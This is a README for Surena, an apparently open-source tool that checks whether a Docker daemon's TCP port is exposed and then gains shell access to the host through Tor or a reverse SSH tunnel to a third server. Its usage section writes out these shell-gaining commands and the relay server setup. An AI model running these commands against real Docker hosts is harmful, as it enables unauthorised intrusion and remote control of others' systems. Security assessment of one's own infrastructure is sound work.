# Surena

Surena is a tool developed to assess vulnerabilities in Docker daemons when their TCP socket is exposed to a network without paying attention to its security issues. It is developed using [Click](https://click.palletsprojects.com), a Python CLI library, and the [Docker SDK for Python](https://docker-py.readthedocs.io/en/stable/). Surena demonstrates how a hacker can gain shell access from an insecure Docker Host using two methods: Tor Network and SSH Reverse Tunneling. To understand more about how Surena works and how to use these methods, please refer to Medium article: [article](https://medium.com/@norouzzadegan/69628c4be503). The name Surena is derived from a Parthian(Iranian) spahbed from the first century BC. For further information, you can visit the [Wikipedia](https://en.wikipedia.org/wiki/Surena) page on Surena.

## Installation

Surena can be installed from PyPI by running:

```bash
pip install surena
```

Once installed, Surena can be run using the following commands in your terminal. To view available commands and options, use:

```bash
surena --help
```

## Using
Surena offers two commands: `is-docker-host` and `get-docker-host`. The `is-docker-host` command checks if the Docker daemon's TCP port is accessible from the network. To understand its options, run:

```bash
surena is-docker-host --help
```

For example, execute the command with these options:

```bash
surena is-docker-host --docker-host-address $DOCKER_HOST_IP --docker-host-port $DOCKER_HOST_PORT
```

The `get-docker-host` command is used to gain shell access from the Docker daemon using two methods. To understand its options, run:

```bash
surena get-docker-host --help
```
Please note, if Surena can gain shell access from the Docker host, it will create a text file named "WARNING.surena" in the "/root/" path of the Docker host.
For example, to gain shell access using the Tor Network method, run this command with the following options:

```bash
surena get-docker-host --docker-host-address $DOCKER_HOST_IP --docker-host-port $DOCKER_HOST_PORT --access-method tor
```

To gain shell access using the Reverse SSH Tunneling method, run this command with the following options:

```bash
surena get-docker-host --docker-host-address $DOCKER_HOST_IP --docker-host-port $DOCKER_HOST_PORT --access-method reverse-ssh --ssh-server-address $THIRD_SERVER_IP --ssh-server-username $THIRD_SERVER_USERNAME --ssh-server-password $THIRD_SERVER_PASSWORD --ssh-server-port $THIRD_SERVER_SSH_PORT
```

Please note that in the remote SSH server or in the `THIRD_SERVER_IP`, which has already been mentioned, the "GatewayPorts" configuration in the `sshd_config` file located at `/etc/ssh/sshd_config` should be changed from `GatewayPorts no` to either `GatewayPorts clientspecified` or `GatewayPorts yes` to enable it.

Additionally, ensure to replace `$DOCKER_HOST_IP`, `$DOCKER_HOST_PORT`, `$THIRD_SERVER_IP`, `$THIRD_SERVER_USERNAME`, `$THIRD_SERVER_PASSWORD`, and `$THIRD_SERVER_SSH_PORT` with the appropriate values.


## Warning
Surena is intended for lab use and to help you understand whether your Docker daemon is secure or insecure. **PLEASE DO NOT USE SURENA FOR MALICIOUS ACTIVITIES.**

## Donate
If Surena has helped you secure your infrastructure, particularly those utilizing Docker daemons over the network, I would be grateful if you could consider supporting by donating Tether or Dogecoin. 

USDT (TRC20): `TXcb1yTW71QZhqVEFx3Y1JGZVu384Mt17B` \
Dogecoin: `DRizEG8R6wW2cW5MNEAnERMMEMq6wupQMA`
